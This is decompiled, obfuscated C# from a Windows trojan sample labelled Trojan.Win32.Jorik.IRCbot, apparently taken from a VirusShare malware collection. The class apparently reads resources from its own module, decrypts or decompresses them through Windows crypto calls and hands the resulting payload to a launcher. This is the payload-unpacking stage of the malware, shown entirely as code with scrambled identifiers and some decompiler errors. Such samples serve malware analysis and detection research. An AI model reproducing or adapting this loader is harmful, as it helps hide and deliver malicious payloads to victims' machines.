// Decompiled with JetBrains decompiler
// Type: "OBN.R. 
// Assembly: 97DB, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 292C2389-E11F-4CEC-A0F7-424E20053F62
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Jorik.IRCbot.mzu-d70820027e476b295f41b01e9a65d878995dce2c6904235e50c149b818bea636.exe

using \u0022O\u001DBN.\u0016R;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0022O\u001DBN.\u0016R
{
  internal class \u0020\u000B
  {
    private const uint \u0030\u0082C\u0009d\u0029 = 4;
    private const uint \u001D\u001BJ\u0025\u001C = 24;
    private const uint \u0007J\u001E\u000CP = 8;
    private const uint \u0022\u0002\u0029\u002E\u001C\u0014 = 2;

    public static void \u0027\u0008\u0026\u00156JB(object _param0)
    {
      byte[] numArray1 = new byte[0];
      byte[] numArray2 = new byte[0];
      \u0020\u000B.\u00259\u003E(ref numArray1, (IntPtr) 1);
      int num = 2;
      while (\u0020\u000B.\u00259\u003E(ref numArray2, (IntPtr) num))
        ++num;
      .\u009FvZ\u0040\u002FJ\u001E\u001D(\u0020\u000B.\u000BB(numArray1, numArray2), \u0020\u000B.wA\u000B\u0024(), (string[]) _param0);
      \u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u003BG.\u001CO\u001E\u0009(0U);
    }

    private static bool \u00259\u003E(ref byte[] _param0, IntPtr _param1)
    {
      try
      {
        IntPtr num1 = \u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u003BG.\u0088\u0007\u0029(IntPtr.Zero, _param1, (IntPtr) 4L);
        IntPtr num2 = \u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u003BG.y\u0016zCx2(IntPtr.Zero, num1);
        IntPtr source = \u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u003BG.\u000C\u00019\u0003\u000CH(num2);
        uint length = \u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u003BG.\u001CY\u000C(IntPtr.Zero, num1);
        Array.Resize<byte>(ref _param0, _param0.Length + (int) length);
        Marshal.Copy(source, _param0, _param0.Length - (int) length, (int) length);
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static uint \u0003F\u0029\u0006I4\u0018(byte[] _param0, ref byte[] _param1)
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr zero2 = IntPtr.Zero;
      uint length = (uint) _param1.Length;
      if (!\u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u0040\u0026\u00206CZ\u002E\u001E.\u0032\u0001(ref zero1, IntPtr.Zero, IntPtr.Zero, 24U, 0U))
      {
        int num1 = \u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u0040\u0026\u00206CZ\u002E\u001E.\u0032\u0001(ref zero1, IntPtr.Zero, IntPtr.Zero, 24U, 8U) ? 1 : 0;
      }
      int num2 = \u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u0040\u0026\u00206CZ\u002E\u001E.\u002E\u0028\u003FI\u002EH\u0026\u0004(zero1, _param0, (uint) _param0.Length, IntPtr.Zero, 0U, out zero2) ? 1 : 0;
      int num3 = \u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u0040\u0026\u00206CZ\u002E\u001E.\u0034D\u0012\u00264\u001A2\u0015\u0020(zero2, IntPtr.Zero, 1, 0U, _param1, ref length) ? 1 : 0;
      return length;
    }

    private static unsafe IntPtr \u000BB(byte[] _param0, byte[] _param1)
    {
      uint num1 = 0;
      uint num2 = \u0020\u000B.\u0003F\u0029\u0006I4\u0018(_param0, ref _param1);
      byte[] numArray = new byte[(int) ((double) num2 * 12.5)];
      fixed (byte* numPtr = &_param1[0])
        ;
      fixed (byte* numPtr = &numArray[0])
        ;
      // ISSUE: fixed variable is out of scope
      // ISSUE: fixed variable is out of scope
      int num3 = \u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u0030\u002Ea.Od\u0007\u0007(2U, (IntPtr) (void*) numPtr, (uint) numArray.Length, (IntPtr) (void*) numPtr, num2, out num1) ? 1 : 0;
      // ISSUE: fixed variable is out of scope
      return (IntPtr) (void*) numPtr;
    }

    private static string wA\u000B\u0024()
    {
      byte[] bytes = new byte[(int) byte.MaxValue];
      int num = \u000E\u0001M\u0023\u0021\u000DJ\u000E\u002B.\u0011\u0010\u0020S\u0021B.\u003BG.\u00379\u001C9\u0003H(IntPtr.Zero, bytes, bytes.Length) ? 1 : 0;
      return Encoding.Unicode.GetString(bytes);
    }
  }
}
